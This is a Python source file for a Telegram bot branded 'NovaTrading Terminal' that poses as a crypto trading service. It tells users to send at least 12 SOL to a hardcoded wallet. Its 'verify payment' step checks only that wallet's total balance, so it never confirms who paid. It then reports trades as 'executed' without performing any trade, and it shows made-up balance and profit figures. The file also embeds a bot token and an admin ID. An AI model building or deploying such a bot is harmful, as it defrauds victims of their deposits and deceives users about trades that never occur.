# --- Imports ---
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import requests

# --- Bot Settings ---
TOKEN = "8647762121:AAEFI9sr5YPKFTCkhFLBS4WqVQ2sxeczxk0"
ADMIN_ID = 6549587750
ADMIN_USERNAME = "OfficialNovachainSupport"  # بدون @
PRIVATE_WALLET = "9z4e4Y8QBtfe8RGvwQ7zdmsv8RTundcPv9icmQua7ggk"
MIN_PAYMENT_SOL = 12

ALLOWED_USERS = [ADMIN_ID]
USER_BALANCE = {}
USER_PROFIT = {}
TOKENS = ["BTC", "ETH", "SOL", "ADA"]

# --- Track pending trades ---
TRADE_PENDING = {}

# --- Helper Functions ---
def is_allowed(user_id):
    return user_id in ALLOWED_USERS

def deny_access_message():
    keyboard = [
        [InlineKeyboardButton("📩 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    return "🚫 Access Denied\nYou don’t have access.\nRegister with the admin first.", InlineKeyboardMarkup(keyboard)

def check_deposit(wallet_address, min_amount=MIN_PAYMENT_SOL):
    url = f"https://public-api.solscan.io/account/tokens?account={wallet_address}"
    try:
        data = requests.get(url).json()
        for token in data:
            if token["tokenSymbol"] == "SOL" and float(token["tokenAmount"]["uiAmount"]) >= min_amount:
                return True
    except:
        pass
    return False

def get_price(symbol="BTC-USD"):
    url = f"https://api.pro.coinbase.com/products/{symbol}/ticker"
    try:
        data = requests.get(url).json()
        return float(data["price"])
    except:
        return "Unavailable"

# --- Start Command ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_allowed(user_id):
        text, markup = deny_access_message()
        await update.message.reply_text(text, reply_markup=markup)
        return

    balance = USER_BALANCE.get(user_id, 0)
    profit = USER_PROFIT.get(user_id, 0)

    keyboard = [
        [InlineKeyboardButton("📊 Dashboard", callback_data="dashboard")],
        [InlineKeyboardButton("📈 Prices", callback_data="prices")],
        [InlineKeyboardButton("⚙️ Trading Engine", callback_data="trading")],
        [InlineKeyboardButton("💼 Deposit", callback_data="wallet")]
    ]

    await update.message.reply_text(
        f"🚀 NovaTrading Terminal\nAccount ID: {user_id}\n💰 Balance: {balance} SOL\n📈 Profit: {profit} SOL",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# --- Dashboard ---
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    balance = USER_BALANCE.get(user_id, 0)
    profit = USER_PROFIT.get(user_id, 0)

    keyboard = [[InlineKeyboardButton("⬅ Back", callback_data="main")]]

    await query.message.reply_text(
        f"📊 DASHBOARD\nBalance: {balance} SOL\nProfit: {profit} SOL",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# --- Wallet ---
async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [[InlineKeyboardButton("✅ Verify Payment", callback_data="verify_payment")]]

    await query.message.reply_text(
        f"💼 Send crypto to:\n`{PRIVATE_WALLET}`\nMinimum Deposit: {MIN_PAYMENT_SOL} SOL",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# --- Verify Deposit ---
async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if check_deposit(PRIVATE_WALLET, MIN_PAYMENT_SOL):
        if user_id not in ALLOWED_USERS:
            ALLOWED_USERS.append(user_id)
        USER_BALANCE[user_id] = MIN_PAYMENT_SOL
        USER_PROFIT[user_id] = 0

        await query.message.reply_text("✅ Deposit confirmed! Trading activated.")
    else:
        await query.message.reply_text("❌ No deposit detected yet.")

# --- Prices ---
async def prices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [[InlineKeyboardButton(f"{t} Price", callback_data=f"price_{t}")] for t in TOKENS]
    keyboard.append([InlineKeyboardButton("⬅ Back", callback_data="main")])

    await query.message.reply_text("📈 Select Token", reply_markup=InlineKeyboardMarkup(keyboard))

# --- Trading ---
async def trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [[InlineKeyboardButton(t, callback_data=f"trade_select_{t}")] for t in TOKENS]
    keyboard.append([InlineKeyboardButton("⬅ Back", callback_data="main")])

    await query.message.reply_text("⚙️ Select Token to Trade", reply_markup=InlineKeyboardMarkup(keyboard))

# --- Button Handler ---
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    # 🔒 GLOBAL LOCK
    if not is_allowed(user_id):
        text, markup = deny_access_message()
        await query.message.reply_text(text, reply_markup=markup)
        return

    if data == "dashboard":
        await dashboard(update, context)

    elif data == "wallet":
        await wallet(update, context)

    elif data == "verify_payment":
        await verify(update, context)

    elif data == "prices":
        await prices(update, context)

    elif data.startswith("price_"):
        token = data.split("_")[1]
        price = get_price(f"{token}-USD")
        await query.message.reply_text(f"{token} Price: ${price}")

    elif data == "trading":
        await trading(update, context)

    elif data.startswith("trade_select_"):
        token = data.split("_")[2]
        TRADE_PENDING[user_id] = {"token": token}

        keyboard = [
            [InlineKeyboardButton("Buy", callback_data=f"trade_action_buy_{token}"),
             InlineKeyboardButton("Sell", callback_data=f"trade_action_sell_{token}")]
        ]

        await query.message.reply_text(f"Select action for {token}", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("trade_action_"):
        action, token = data.split("_")[2], data.split("_")[3]
        TRADE_PENDING[user_id]["action"] = action
        price = get_price(f"{token}-USD")

        keyboard = [
            [InlineKeyboardButton("0.01", callback_data=f"trade_amount_0.01_{token}"),
             InlineKeyboardButton("0.05", callback_data=f"trade_amount_0.05_{token}"),
             InlineKeyboardButton("0.1", callback_data=f"trade_amount_0.1_{token}")],
            [InlineKeyboardButton("Custom", callback_data=f"trade_amount_custom_{token}")]
        ]

        await query.message.reply_text(
            f"Select amount to {action} {token}\nPrice: ${price}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data.startswith("trade_amount_"):
        parts = data.split("_")
        token = parts[3]
        trade = TRADE_PENDING.pop(user_id)
        action = trade["action"]

        if parts[2] == "custom":
            TRADE_PENDING[user_id] = {"token": token, "action": action, "awaiting_custom": True}
            await query.message.reply_text(f"Enter custom amount for {action} {token}:")
        else:
            amount = float(parts[2])
            await query.message.reply_text(
                f"✅ {action.upper()} {amount} {token} executed!\nPrice: ${get_price(f'{token}-USD')}"
            )

    elif data == "main":
        await start(update, context)

# --- Handle Custom Amount ---
async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # 🔒 LOCK HERE TOO
    if not is_allowed(user_id):
        text, markup = deny_access_message()
        await update.message.reply_text(text, reply_markup=markup)
        return

    if user_id not in TRADE_PENDING or not TRADE_PENDING[user_id].get("awaiting_custom"):
        return

    trade = TRADE_PENDING.pop(user_id)

    try:
        amount = float(update.message.text)
        token = trade["token"]
        action = trade["action"]

        await update.message.reply_text(
            f"✅ {action.upper()} {amount} {token} executed!\nPrice: ${get_price(f'{token}-USD')}"
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# --- Run Bot ---
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount))

print("NovaTrading Bot Running...")
app.run_polling()